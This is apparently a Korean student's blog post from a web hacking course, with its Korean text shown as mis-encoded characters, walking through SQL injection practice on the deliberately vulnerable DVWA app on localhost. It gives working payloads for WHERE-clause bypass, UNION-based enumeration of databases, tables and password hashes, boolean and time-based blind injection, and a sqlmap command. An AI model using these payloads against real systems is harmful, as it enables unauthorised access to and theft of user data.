---
title:  '[ê°•ì˜] 5ì£¼ì°¨ ì›¹ í•´í‚¹- ì›¹ í•´í‚¹ ê¸°ìˆ  íƒìƒ‰ 4'
excerpt: "week5"

categories:
  - hacking
tags: [study, virtualbox, kalilinux, hacking]

last_modified_at: 2021-07-23T08:06:00-05:00
classes: wide
---

### 6ì£¼ê°„ì˜ í•´í‚¹ ìŠ¤í„°ë”” ë‹¤ì„¯ë²ˆì§¸ ì‹œê°„

ë²Œì¨ 5ì£¼ì°¨ê°€ ë˜ì—ˆë‹¤. ì‹œê°„ì´ ì°¸ ë¹ ë¥¸ ê²ƒ ê°™ë‹¤. ë‚´ê°€ ì—°êµ¬í•  ë¶„ì•¼ì™€ëŠ” ê´€ë ¨ì´ ì—†ì§€ë§Œ ì•Œì•„ë‘ë©´ ë§¤ìš° ì¢‹ì„ê²ƒ ê°™ì•„ì„œ ë“£ëŠ” ë‚´ë‚´ ìœ ìµí•´ì„œ ì—¬ê¸°ê¹Œì§€ ì˜¨ ê²ƒ ê°™ë‹¤ ã…ã…

ê°•ì˜ë§í¬ëŠ” ì˜¤ë¥¸ìª½ í´ë¦­! => [goormedu](https://edu.goorm.io/lecture/4953/í™”ì´íŠ¸í•´ì»¤ê°€-ë˜ê¸°-ìœ„í•œ-8ê°€ì§€-ì›¹-í•´í‚¹-ê¸°ìˆ )

<br>
ì´ë²ˆ ì‹œê°„ì€ ê³µê²©ì— ì„±ê³µí•  ê²½ìš° í° í”¼í•´ë¥¼ ì…í ìˆ˜ ìˆëŠ” SQLë¬¸ ì£¼ì…ì„ í†µí•´ ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ì¡°ì‘í•˜ëŠ” **SQL ì¸ì ì…˜ ê³µê²©**ì— ëŒ€í•´ ì•Œì•„ë³´ê² ìŠµë‹ˆë‹¤.

<hr>

### SQL ì¸ì ì…˜ ê³µê²©

DBì— ì „ì†¡ë˜ëŠ” SQL ì¿¼ë¦¬ë¬¸ì„ ì¡°ì‘í•´ DBë‚´ì˜ ë°ì´í„°ë¥¼ ë³€ì¡°í•˜ê±°ë‚˜ ë‹¤ë¥¸ ì‚¬ìš©ìì˜ ê°œì¸ì •ë³´ì™€ ê°™ì´ í—ˆê°€ë˜ì§€ ì•Šì€ ì •ë³´ì— ì ‘ê·¼í•˜ëŠ” ê³µê²©ì´ë‹¤. ì›¹ì‚¬ì´íŠ¸ì˜ íšŒì›ì •ë³´ ë“± ê°œì¸ì •ë³´ë¥¼ ë¹¼ë‚´ëŠ” ê³µê²©ìœ¼ë¡œ ìµœê·¼ê¹Œì§€ ê¾¸ì¤€íˆ ì‚¬ìš©ëœë‹¤ê³  í•œë‹¤.ğŸ¥µğŸ¥µ

SQL ì¸ì ì…˜ ê³µê²©ì—ëŠ” ê¸°ë³¸ 2ê°€ì§€ê°€ ìˆë‹¤. 

### 1. where êµ¬ë¬¸ ê³µê²©

IDê°€ 1ì¸ ì‚¬ìš©ì ì •ë³´ë¥¼ ìš”ì²­í•˜ëŠ” ì‹œë‚˜ë¦¬ì˜¤!

ìš”ì²­ì„ ë°›ìœ¼ë©´ ì›¹ì–´í”Œë¦¬ì¼€ì´ì…˜ì€ ë‚´ë¶€ DBë¡œ ì¡°ê±´ë¬¸ `WHERE`ì„ í¬í•¨í•˜ë‚˜ SQL ì¿¼ë¦¬ë¬¸ì„ ì „ì†¡í•˜ëŠ”ë°, ì¿¼ë¦¬ë¬¸ì„ í•´ì„í•´ë³´ë©´ ID=1 ì¸ ì‚¬ìš©ìì˜ ì´ë¦„ê³¼ ì´ë©”ì¼ì„ ê°€ì ¸ì˜¤ë¼ëŠ” ê²ƒì´ë‹¤.

ì´ ì¿¼ë¦¬ê°€ ì‹¤í–‰ì´ ë˜ë©´ IDê°€ 1ì¸ ì‚¬ìš©ì ì •ë³´ê°€ ì›¹ì–´í”Œë¦¬ì¼€ì´ì…˜ì„ í†µí•´ ì‚¬ìš©ìì—ê²Œ ì „ì†¡ëœë‹¤. 

![image](https://user-images.githubusercontent.com/53431568/126730025-8f3f63c4-b4b2-4a87-958e-73128e1df656.png)

ì´ë•Œ! í•´ì»¤ê°€ 1 ë’¤ì— `' or '1'='1` ì´ëŸ°ì‹ìœ¼ë¡œ ì¡°ì‘í•´ì„œ ë³´ë‚¸ë‹¤. ì¦‰, **'1'='1 ì´ë¼ëŠ” í•­ìƒ ì°¸**ì´ë˜ëŠ” ì¡°ê±´ìœ¼ë¡œ ì¡°ì‘ì„ í•´ë²„ë¦° ê²ƒì´ë‹¤. ğŸ¥µğŸ¥µğŸ¥µ

![image](https://user-images.githubusercontent.com/53431568/126730455-9a1af10f-d59e-4c40-a464-a2bf14e4ee4a.png)

ê²°êµ­ WHERE êµ¬ë¬¸ì´ ìš°íšŒê°€ ë˜ë©° ëª¨ë“ ì‚¬ìš©ìì˜ ê°œì¸ì •ë³´ë¥¼ ë°˜í™˜í•˜ê²Œ ëœë‹¤.

![image](https://user-images.githubusercontent.com/53431568/126730546-54b50da6-66c5-4bba-adcc-8308b3186c19.png)



### 2. UNION

ë˜‘ê°™ì€ ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ê°€ì •í•˜ì!

![image](https://user-images.githubusercontent.com/53431568/126730025-8f3f63c4-b4b2-4a87-958e-73128e1df656.png)

ì´ë²ˆì— í•´ì»¤ëŠ” or ëŒ€ì‹ ì— `union` ì„ ì´ìš©í•´ ë’¤ì— PASSWORDë¥¼ ìš”ì²­í•˜ëŠ” êµ¬ë¬¸ì„ ì‹¤í–‰í•˜ì˜€ë‹¤.

ì•„ë˜ ê·¸ë¦¼ê³¼ ê°™ì´ unionì„ ì‚¬ì´ì— ë‘ê³  SELECT êµ¬ë¬¸ ë‘ê°œê°€ ë°°ì¹˜ë˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤. => **`unionì€ í•©ì§‘í•© ê°œë…ìœ¼ë¡œ ë‘ê°œì˜ êµ¬ë¬¸ì„ í¬í•¨í•´ ì‹¤í–‰ì‹œí‚¨ë‹¤.`**

ëì— ì‚½ì…ëœ #ì€ ë’¤ì— ì˜¤ëŠ” ì¿¼ë¦¬ë¬¸ì„ ìƒëµí•œë‹¤ëŠ” ëœ»ìœ¼ë¡œ í•´ì»¤ê°€ ì›í•˜ëŠ” ëª…ë ¹ì–´ë§Œ ì‹¤í–‰í•˜ì—¬ ê³µê²©í•  ìˆ˜ ìˆê²Œ ëœë‹¤.ğŸ™€ğŸ™€ ì¦ë§ í¥ë¯¸ì§„ì§„í•˜ë‹¤ ã…‹ã…‹ã…‹

![image](https://user-images.githubusercontent.com/53431568/126730690-03ad46b7-0063-4d21-9f11-d4839825affc.png)

ì´ëŸ°ì‹ìœ¼ë¡œ ì •ë³´ë¥¼ ë¹¼ë‚´ê²Œ ëœë‹¤.

![image](https://user-images.githubusercontent.com/53431568/126730890-f88395e8-a76c-4ca6-9d17-9b3a2af79c23.png)


<br>

ì´ì œ ì¬ë¯¸ìˆëŠ” ì‹¤ìŠµì˜ ì‹œê°„ì´ë‹¤ ã…ã…

###  SQL ì¸ì ì…˜ ê³µê²© ì‹¤ìŠµ

### (1) LOW ë‹¨ê³„ - WHERE

ë¨¼ì € securityë¥¼ lowë¡œ ì„¤ì •í•˜ê³  SQL Injection í˜ì´ì§€ì—ì„œ User ID: 1 ì„ ì…ë ¥í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ ì •ë³´ê°€ ì¶œë ¥ëœë‹¤.

![image](https://user-images.githubusercontent.com/53431568/126731020-c9dc323e-9e78-4471-a5f1-2a95a113e45e.png)

ì†ŒìŠ¤ì½”ë“œë¥¼ í™•ì¸í•´ ì–´ë–»ê²Œ ë™ì‘í•˜ëŠ”ì§€ ì•Œì•„ë³´ì!

ë‹¤ìŒê³¼ ê°™ì´ query ë¬¸ì„ ë³´ë©´ idê°€ ë“¤ì–´ì˜¤ëŠ” ë¶€ë¶„ì— ì´ë¯¸ `'$id'` ì²˜ëŸ¼ `ì‘ì€ë”°ì˜´í‘œ ë‘ê°œ('')` ë¡œ ë‘˜ëŸ¬ìŒ“ì¸ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤. 

ì´ ê³³ì— ë˜ ë‹¤ë¥¸ ì‘ì€ë”°ì˜´í‘œê°€ ë“¤ì–´ì˜¤ë©´ ì´ `user_id='''` ì´ëŸ°ì‹ìœ¼ë¡œ ì‘ì€ë”°ì˜´í‘œê°€ 3ê°œê°€ ë˜ì–´ ì—ëŸ¬ê°€ ë°œìƒí•œë‹¤. í•œë²ˆ í™•ì¸í•´ë³´ì!

![image](https://user-images.githubusercontent.com/53431568/126731183-4186e00b-b6b5-44d1-948d-f0922a8ecacc.png)


ì‘ì€ë”°ì˜´í‘œ ' ë¥¼ ì…ë ¥í•˜ì˜€ë”ë‹ˆ ì •ë§ ì—ëŸ¬ê°€ ë°œìƒí•˜ì˜€ë‹¤. ì´ë ‡ê²Œ **ë¹„ì •ìƒì ì¸ ë¬¸ìë¥¼ ì…ë ¥í–ˆì„ ë•Œ SQLì¿¼ë¦¬ë¬¸ì´ ì˜ëª»ë˜ì–´ ì—ëŸ¬ê°€ ë‚˜ë©´ í•´ë‹¹ í˜ì´ì§€ëŠ” SQLì¿¼ë¦¬ë¬¸ì„ ì‚¬ìš©í•˜ì—¬ ë™ì‘**í•œë‹¤ëŠ” ê²ƒì„ í•´ì»¤ëŠ” ëˆˆì¹˜ì±Œ ìˆ˜ ìˆìœ¼ë©° ì´ê²ƒì„ ë³´ê³  SQL ì¿¼ë¦¬ë¬¸ìœ¼ë¡œ ê³µê²©í•  ìˆ˜ ìˆêµ¬ë‚˜!! ë¼ê³  ì—¬ì§€ë¥¼ ì£¼ê²Œ ë˜ëŠ” ê²ƒì´ë‹¤.

![image](https://user-images.githubusercontent.com/53431568/126731075-df49a603-5c6e-4fef-b9d2-d3f207fc95c4.png)

ì´ë²ˆì—” **1' or '1'='1**ì„ ì‹¤í–‰í•´ë³´ë©´ í…Œì´ë¸”ì˜ ëª¨ë“  ì •ë³´ê°€ ì¶œë ¥ë˜ì—ˆë‹¤.!! IDê°€ 1ì´ë¼ëŠ” ê²ƒê³¼ ìƒê´€ì—†ì´ ëª¨ë“  ì‚¬ìš©ìì˜ ì •ë³´ê°€ ë‚˜ì˜¤ê²Œ ëœ ê²ƒì´ë‹¤. 

![image](https://user-images.githubusercontent.com/53431568/126731533-22390548-dd64-41cd-bea2-80f8b15b7b0d.png)

ìœ„ì—ì„œ ì„¤ëª…í•œ # ì„ ì´ìš©í•˜ì—¬ ì‘ì€ë”°ì˜´í‘œ(')ë¥¼ ì…ë ¥í•´ë„ ì—ëŸ¬ê°€ ë°œìƒí•˜ì§€ ì•Šê²Œ í•´ë³´ì.
'ID' ì´ëŸ°ì‹ìœ¼ë¡œ ì‘ì€ë”°ì˜´í‘œ ì•ˆì— IDê°€ ê°ì‹¸ì§€ë¯€ë¡œ `**'#**` ì„ ì…ë ¥í•œë‹¤ë©´ ''id#' ìœ¼ë¡œ ê°’ì´ ë“¤ì–´ê°€ê³  #ë’¤ì˜ ëª…ë ¹ì–´ëŠ” ì£¼ì„ì²˜ë¦¬ ë˜ë¯€ë¡œ ì‘ì€ë”°ì˜´í‘œ(')ê°€ 2ê°œê°€ ë˜ì–´ ì—ëŸ¬ê°€ ë°œìƒí•˜ì§€ ì•Šê²Œ ë˜ëŠ” ê²ƒì´ë‹¤.
 
![image](https://user-images.githubusercontent.com/53431568/126731668-6989cb9a-de8c-4a58-83f6-ac783bdbe99c.png)



### (1) LOW ë‹¨ê³„ - UNION

UNIONì„ ì´ìš©í•œë‹¤ë©´ DBì˜ ëª¨ë“  ì •ë³´ë¥¼ ì•Œì•„ë‚¼ ìˆ˜ ìˆë‹¤. UNIONì„ ì‚¬ìš©í•˜ë ¤ë©´ `**ì›ë˜ ì¿¼ë¦¬ë¬¸ì´ ì¡°íšŒí•˜ëŠ” SELECTë¬¸ì˜ ì¹¼ëŸ¼ê°¯ìˆ˜**`ì™€ `**UNIONë’¤ì˜ SELECTë¬¸ì—ì„œ ìš”ì²­í•˜ëŠ” ì¹¼ëŸ¼ìˆ˜**`ê°€ ê°™ì•„ì•¼ í•œë‹¤. ì•„ë‹ˆë©´ ì—ëŸ¬ë°œìƒ! 

ë”°ë¼ì„œ **ì›ë˜ ì¿¼ë¦¬ë¬¸ì´ ëª‡ê°œì˜ ì¹¼ëŸ¼ì„ ë°˜í™˜ í•˜ëŠ”ì§€ ì•Œì•„ë‚´ì•¼ í•œë‹¤.** 

ì‹¤í–‰í•´ë³´ì! ë‹¤ìŒê³¼ ê°™ì´ ëª…ë ¹ì–´ë¥¼ ì…ë ¥í•˜ë©´... 
![image](https://user-images.githubusercontent.com/53431568/126732180-8989ba20-2282-4cb0-9bd4-9fda738ca14d.png)

ì¹¼ëŸ¼ìˆ˜ê°€ ë§ì§€ ì•ŠëŠ”ë‹¤ëŠ” ê²½ê³  ë©”ì„¸ì§€ë¥¼ ë³´ì—¬ì¤€ë‹¤.

![image](https://user-images.githubusercontent.com/53431568/126732164-2e94daea-17c2-4c10-83b6-7a01744f7e0d.png)

ì´ë²ˆì—ëŠ” ì¹¼ëŸ¼ 2ê°œë¥¼ ë„£ì–´ë³´ì•˜ë”ë‹ˆ ì•„ë˜ì™€ ê°™ì´ ê²°ê³¼ê°€ ì¶œë ¥ë˜ì—ˆë‹¤.! ì¦‰, union ì´ì „ ì¿¼ë¦¬ë¬¸ì€ 2ê°œì˜ ì¹¼ëŸ¼ì„ ì¡°íšŒí•œë‹¤ëŠ” ê²ƒì„ ì•Œì•„ë‚´ì—ˆë‹¤.

![image](https://user-images.githubusercontent.com/53431568/126732267-6f651c08-4da5-43a9-94ed-a47980280fea.png)

ë‹¤ë¥¸ ë°©ë²•ì„ ì´ìš©í•´ì„œë„ ì¹¼ëŸ¼ê°¯ìˆ˜ë¥¼ ì•Œ ìˆ˜ ìˆë‹¤. ë°”ë¡œ `ORDER BY`ë¼ëŠ” í‚¤ì›Œë“œë¥¼ ì´ìš©í•˜ëŠ” ê²ƒì´ë‹¤. ì´ í‚¤ì›Œë“œëŠ” ì–´ë–¤ ì¹¼ëŸ¼ì„ ê¸°ì¤€ìœ¼ë¡œ ì •ë ¬í• ë•Œ ì“°ëŠ” êµ¬ë¬¸ì¸ë° ì¹¼ëŸ¼ì˜ ê°¯ìˆ˜ë³´ë‹¤ í¬ë©´ ì—ëŸ¬ê°€ ë°œìƒí•˜ê²Œ ëœë‹¤. ë”°ë¼ì„œ ì›ë˜ ì¹¼ëŸ¼ê°¯ìˆ˜ë¥¼ ë§ì¶œ ìˆ˜ ìˆë‹¤. 

2ì¼ë•Œ, 

![image](https://user-images.githubusercontent.com/53431568/126732412-d6fe50ed-46c4-4b81-85a3-ef6f2fb0af6e.png)

3ì¼ë•Œ, 3ì´ë¼ëŠ” ì¹¼ëŸ¼ì„ ì•Œ ìˆ˜ ì—†ë‹¤ë¼ëŠ” ì—ëŸ¬ë©”ì„¸ì§€ë¥¼ ì¶œë ¥í•œë‹¤. ë”°ë¼ì„œ 2ê°œì˜ ì¹¼ëŸ¼ê¹Œì§€ ìˆë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤. 
![image](https://user-images.githubusercontent.com/53431568/126732428-2d3c492c-92a4-46cb-9dd5-9f0b3d9c7e42.png)

ì´ì œ union ê³µê²©ì„ í•´ë³´ì!ğŸ™‹ğŸ½ğŸ™‹ğŸ½



#### ë°ì´í„°ë² ì´ìŠ¤ ëª… ì¡°íšŒ

~~~sql 
1' union select schema_name,1 from information_schema.schemata #
~~~

![image](https://user-images.githubusercontent.com/53431568/126734180-ee4edb97-9856-46f9-9c3c-71c3d9ca07d5.png)


#### dvwa ë°ì´í„°ë² ì´ìŠ¤ì˜ í…Œì´ë¸” ëª… ì¡°íšŒ

~~~sql 
1' union select table_schema, table_name from information_schema.tables where table_schema = 'dvwa' #
~~~
 
ìœ„ì˜ ëª…ë ¹ì–´ë¥¼ í†µí•´ guestbook, users ë¼ëŠ” í…Œì´ë¸”ì´ ìˆëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ê°œì¸ì •ë³´ê°€ ìˆëŠ”ê²ƒì²˜ëŸ¼ ë³´ì´ëŠ” users í…Œì´ë¸”ì„ ì‚´í´ë³´ë„ë¡ í•œë‹¤.
 
![image](https://user-images.githubusercontent.com/53431568/126734262-bc25ea5c-2802-4bd8-95bf-d94b0cbc18cb.png)


<br>

#### users í…Œì´ë¸” ì¹¼ëŸ¼ ì¡°íšŒ
~~~sql 
1' union select table_name, column_name from information_schema.columns where table_schema = 'dvwa' and table_name = 'users'#
~~~ 

user_id, first name, surname, passwd ë¥¼ ë³´ì—¬ì¤€ë‹¤.

![image](https://user-images.githubusercontent.com/53431568/126734314-e90e55e6-27e0-42a2-bd36-83dff156ba39.png)


<br>

ì´ì œ, users í…Œì´ë¸”ì—ì„œ ì‚¬ìš©ìì´ë¦„ê³¼ password ë§Œ ì¶œë ¥í•´ë³´ì!

~~~sql 
1' union select user,password from users#
~~~

ì•„ë˜ì™€ ê°™ì´ ì‚¬ìš©ìëª…ê³¼ passwordê°€ surnameì— í•´ì‰¬ê°’ì˜ í˜•íƒœë¡œ ì¶œë ¥ë˜ì—ˆë‹¤.

![image](https://user-images.githubusercontent.com/53431568/126735858-c0236516-1178-405a-960f-28cb22592854.png)


êµ¬ê¸€íƒ­ì— í•´ì‰¬ê°’ì„ ë„£ì–´ passwordë¥¼ ì•Œì•„ë³´ë©´ ì–´ë–¤ ë¬¸ìì—´ì¸ì§€ ì•Œ ìˆ˜ ìˆë‹¤. 

![image](https://user-images.githubusercontent.com/53431568/126735889-1337e38b-b9a2-4f33-9408-3ce03156c98b.png)

ì´ ì¤‘ ì•„ë¬´ì‚¬ì´íŠ¸ë‚˜ ë“¤ì–´ê°€ì„œ í™•ì¸í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ í•´ì‰¬ê°’ì´ 'password' ë¼ëŠ” ê²ƒì„ ì•Œë ¤ì¤€ë‹¤.

![image](https://user-images.githubusercontent.com/53431568/126735935-6aa6fc22-2456-4ab6-b08b-053c5e9626d4.png)


<br><br>

ì´ ë°–ì—ë„ ë‹¤ì–‘í•œ ëª…ë ¹ì–´ë“¤ë¡œ ê³µê²©ì„ í•  ìˆ˜ ìˆë‹¤. ëª…ë ¹ì–´ë“¤ì„ ì •ë¦¬í•´ë‘ì—ˆë‹¤.

<details markdown="1">
<summary>ëª…ë ¹ì–´ ì •ë¦¬ğŸ”</summary>

~~~sql 
-- WHERE êµ¬ë¬¸ ìš°íšŒ
1' or '1'='1

-- UNIONì„ ì´ìš©í•œ ì¹¼ëŸ¼ ê°¯ìˆ˜ ì•Œì•„ë‚´ê¸°
1' union select 1,1#

-- ORDER BY êµ¬ë¬¸ì„ ì´ìš©í•œ ì¹¼ëŸ¼ ê°¯ìˆ˜ ì•Œì•„ë‚´ê¸°
1' order by 2#

-- ë°ì´í„°ë² ì´ìŠ¤ ëª… ì¡°íšŒ
1' union select schema_name,1 from information_schema.schemata #

-- dvwa ë°ì´í„°ë² ì´ìŠ¤ì˜ í…Œì´ë¸” ëª… ì¡°íšŒ
1' union select table_schema, table_name from information_schema.tables where table_schema = 'dvwa' #

-- users í…Œì´ë¸” ì¹¼ëŸ¼ ì¡°íšŒ
1' union select table_name, column_name from information_schema.columns where table_schema = 'dvwa' and table_name = 'users'# 

-- ë¸”ë¼ì¸ë“œ SQL ì¸ì ì…˜ ì°¸ êµ¬ë¬¸
1' AND 1=1# 

-- ë¸”ë¼ì¸ë“œ SQL ì¸ì ì…˜ ê±°ì§“ êµ¬ë¬¸
1' AND 1=2#

-- ì‹œê°„ê¸°ë°˜ ë¸”ë¼ì¸ë“œ SQL ì¸ì ì…˜ íƒì§€ êµ¬ë¬¸
1' AND SLEEP(5)#
~~~
</details>

<br><br>

### (2) ë¸”ë¼ì¸ë“œ SQL ì¸ì ì…˜

ì‚¬ìš©ì ì •ë³´ë¥¼ ì•Œë ¤ì¤€ ëŒ€ì‹  í•´ë‹¹ ì•„ì´ë””ì˜ ì¡´ì¬ì—¬ë¶€ ì •ë³´ë§Œ ì•Œë ¤ì¤€ë‹¤. 1 ì„ ì…ë ¥í•˜ë©´ IDê°€ ì¡´ì¬í•œë‹¤ê³  í•´ì¤€ë‹¤.

![image](https://user-images.githubusercontent.com/53431568/126736153-a95761ea-2d93-43f7-8557-1f54032714aa.png)

ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ID ë¼ë©´ ë‹¤ìŒê³¼ ê°™ì´ ëœ¬ë‹¤.

![image](https://user-images.githubusercontent.com/53431568/126736937-c6883f55-8717-4e0c-88ec-d3ddaaba38d7.png)


ê·¸ë ‡ë‹¤ë©´ í•­ìƒ ì°¸ì¸ ëª…ì œì¸ ê°’ì„ ì•„ë˜ì™€ ê°™ì´ AND ë’¤ì— ì„¤ì •í•œë‹¤ë©´ IDê°€ ì¡´ì¬í•œë‹¤ê³  ì•Œë ¤ì¤€ë‹¤.

ì´ëŸ°ì‹ìœ¼ë¡œ ì–´ë–¤ í¼ ë’¤ì— AND ì™€ ê°™ì€ ì—°ì‚°ì´ ì‹¤í–‰ë˜ê³  ìˆë‹¤ë©´ SQL ì¿¼ë¦¬ë¬¸ì´ ë’¤ì— ìœ„ì¹˜í•œë‹¤ëŠ” íŒíŠ¸ë¥¼ í•´ì»¤ì—ê²Œ ì£¼ê²Œ ëœë‹¤.

![image](https://user-images.githubusercontent.com/53431568/126737044-d5d2ca85-032a-4956-9829-b5e3427dc596.png)

<br>

#### ì´ê²ƒìœ¼ë¡œ ë¬´ì—‡ì„ í•  ìˆ˜ ìˆëŠ”ê°€â“â“

> ë¸”ë¼ì¸ë“œ SQL ì¸ì ì…˜ì€ ë¹„ë¡ ê²°ê³¼ë¥¼ ì§ì ‘ì ìœ¼ë¡œ ì–»ì„ ìˆœ ì—†ì§€ë§Œ, ë§Œì•½ adminì´ë¼ëŠ” ì‚¬ìš©ìê°€ ì¡´ì¬í•˜ëŠ”ì§€ì™€ ê°™ì´ ì–´ë–¤ ëª…ì œë¥¼ ì œì‹œí•˜ê³  ë’¤ì— ANDë¥¼ ë¶™ì—¬ ë‹¤ë¥¸ ì¡°ê±´ì„ ì£¼ì–´ ê·¸ ëª…ì œê°€ ì°¸ì¸ì§€ ê±°ì§“ì¸ì§€ ì•Œ ìˆ˜ ìˆë‹¤. ì´ê²ƒì€ ì‹œê°„ì´ ì˜¤ë˜ê±¸ë¦¬ì§€ë§Œ ì¼ì¼íˆ ëŒ€ì…í•´ ì–´ë–¤ê²ƒì´ ìˆëŠ”ì§€ ì—†ëŠ”ì§€ë¥¼ íŒŒì•…í•´ ì›í•˜ëŠ” ì •ë³´ë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤.
> 
<br>

**F12**í‚¤ë¥¼ ëˆŒëŸ¬ ê°œë°œì íƒ­ì„ ì¼œì„œ ìš”ì²­ì— ëŒ€í•œ ê±¸ë¦°ì‹œê°„ì„ ì•Œì•„ë³´ì. Network ë©”ë‰´ë¥¼ í´ë¦­! 

`1' AND sleep(5)#` ì´ë¼ëŠ” ëª…ë ¹ì–´ë¥¼ ì…ë ¥í•˜ë‹ˆ ë‹¤ìŒê³¼ ê°™ì´ ê±¸ë¦° ì‹œê°„ì„ ì•Œë ¤ì¤€ë‹¤. ì•½ 5ì´ˆì •ë„ê°€ ê±¸ë ¸ë‹¤.

![image](https://user-images.githubusercontent.com/53431568/126737601-b36e7b63-1e11-4b92-ae0c-d8cd886a404e.png)


ì´ë²ˆì—” ì¡´ì¬í•˜ì§€ ì•ŠëŠ” IDì¸ 6ì„ ë„£ì–´ `6' AND sleep(5)#` ì´ë¼ëŠ” ëª…ë ¹ì–´ë¥¼ ì…ë ¥í–ˆë”ë‹ˆ ì‘ë‹µì´ ì•„ì£¼ ë¹ ë¥´ê²Œ ì˜¨ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.

![image](https://user-images.githubusercontent.com/53431568/126737699-382c8ba5-725f-431f-bcf4-d5f6a1bc1d75.png)

> ğŸ’¡ ì´ëŸ°ì‹ìœ¼ë¡œ ID 1ì€ ì¡´ì¬í•˜ê³  6ì€ ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ë‹¤ëŠ” ê²ƒì„ í•´ì»¤ëŠ” ì•Œì•„ë‚¼ ìˆ˜ ìˆë‹¤.

<br><br>

### (3) SQLMAP

SQL ì¸ì ì…˜ ê³µê²© í”„ë¡œê·¸ë¨ì¤‘ ê°€ì¥ ëŒ€ì¤‘ì ì¸ SQLMAPì„ í†µí•´ ìë™ìœ¼ë¡œ ê³µê²©í•˜ëŠ” ë°©ë²•ì„ ì•Œì•„ë³´ì!

ë¨¼ì € SQLMAP í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰í•˜ì! ì´ í”„ë¡œê·¸ë¨ì€ application -> webapplication ì— ìˆë‹¤.

![image](https://user-images.githubusercontent.com/53431568/126737920-d06368cc-a62f-447c-9369-b66ac7372fde.png)

ë”ë¸”í´ë¦­í•˜ì—¬ ì‹¤í–‰í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì€ í„°ë¯¸ë„ ì°½ì´ ëœ¬ë‹¤.

![image](https://user-images.githubusercontent.com/53431568/126737965-ee0fa2cb-22ec-4a0d-8dca-58f4fa89e7b6.png)

ì´ ì°½ì— ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•  ê±´ë° sqlmap -u ë’¤ì—ëŠ” ì°¸ì¸ ê°’ì´ ë“¤ì–´ì™€ì•¼ í•˜ë¯€ë¡œ SQL Injection (Blind) í˜ì´ì§€ì—ì„œ idë¥¼ 1ë¡œ ì…ë ¥í–ˆì„ ë•Œì˜ ì£¼ì†Œë¥¼ ë³µì‚¬í•´ ë¶™ì—¬ì„œ ì‹¤í–‰í•œë‹¤. ì´ë•Œ ë’¤ì— ë¶™ì€ #ì€ ì—†ì• ë„ ìƒê´€ì—†ë‹¤.

![image](https://user-images.githubusercontent.com/53431568/126738272-2b1cc819-d77f-43ca-8a37-a66aea93eaaa.png)

ì´ ë’¤ì— ì¿ í‚¤ê°’ì„ ë„£ì–´ì•¼ í•˜ëŠ”ë°, ì¿ í‚¤ë¥¼ ì•Œì•„ë‚´ë ¤ë©´ F12ë¡œ ê°œë°œìíƒ­ í™œì„±í™” í›„ Console ì°½ìœ¼ë¡œ ì´ë™í•´ `document.cookie`ë¥¼ ì…ë ¥í•œë‹¤. ì¶œë ¥ëœ ë©”ì„¸ì§€ë¥¼ ë³µì‚¬í•´ ë¶™ì—¬ì¤€ë‹¤.

![image](https://user-images.githubusercontent.com/53431568/126738493-a9fe1d0d-8d06-46e9-bcb4-39d07e26dffa.png)


ìµœì¢…ì ìœ¼ë¡œ ì…ë ¥í•  ëª…ë ¹ì–´ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.

~~~sql
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=m6tod3hikjqo1u1pkm9973e6e0" 
~~~

ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•˜ì ë§ˆì ì§§ì€ ì‹œê°„ì— id parameterì„ í†µí•´ AND boolean based blind ê³µê²©ì´ ê°€ëŠ¥í•  ê²ƒ ê°™ë‹¤ë¼ëŠ” ë©”ì„¸ì§€ê°€ ë‚˜ì˜¨ë‹¤. ë˜, ë°±ì—”ë“œì—ì„œ ì‚¬ìš©í•œ DBMSì˜ ì–¸ì–´ê°€ MySQLì´ë¼ëŠ” ê²ƒì„ ì•Œì•„ë‚´ì—ˆë‹¤.

ê·¸ë ‡ê¸° ë•Œë¬¸ì— ë‹¤ë¥¸ DBì— ëŒ€í•œ ê³µê²©ì€ SKIP í• ê²ƒì¸ì§€ì— ëŒ€í•œ ë¬¼ìŒì´ ë‚˜ì˜¤ëŠ”ë° -> `Y`ë¥¼ ì„ íƒí•˜ì

![image](https://user-images.githubusercontent.com/53431568/126738775-eb3b47c9-f23c-4e57-9466-e53980c8a9a0.png)

ë‹¤ìŒìœ¼ë¡œ MySQLì— ëŒ€í•œ ëª¨ë“  í…ŒìŠ¤íŠ¸ë¥¼ í• ê²ƒì¸ì§€ì— ëŒ€í•œ ë¬¼ìŒë„ -> `Y` ì„ íƒ!

![image](https://user-images.githubusercontent.com/53431568/126738946-6d4392b9-d191-4619-8857-822c78b6d94b.png)


ì‹œê°„ì´ ì•½ê°„ ê±¸ë¦° í›„ ë˜ ë‹¤ë¥¸ í…ŒìŠ¤íŠ¸ë¥¼ í•  ê²ƒì¸ì§€ ë‚˜ì˜¤ëŠ”ë° ëª¨ë‘ `N` ì„ ì„ íƒí•˜ì

<br>

ìµœì¢…ì ìœ¼ë¡œ ë‚˜ì˜¨ í™”ë©´ì´ë‹¤. ì´ í”„ë¡œê·¸ë¨ì´ ì§€ê¸ˆ 316ê°œì˜ HTTP ìš”ì²­ì„ ìë™ìœ¼ë¡œ ë³´ëƒˆì—ˆê³ , ID ë¼ëŠ” íŒŒë¼ë¯¸í„°ê°€ boolean-based blindê³µê²©ê³¼ AND/OR time-based blind ê³µê²©ì— ê°€ëŠ¥í•˜ë‹¤ëŠ” ê²ƒì„ ì•Œë ¤ì£¼ê³  ìˆë‹¤.

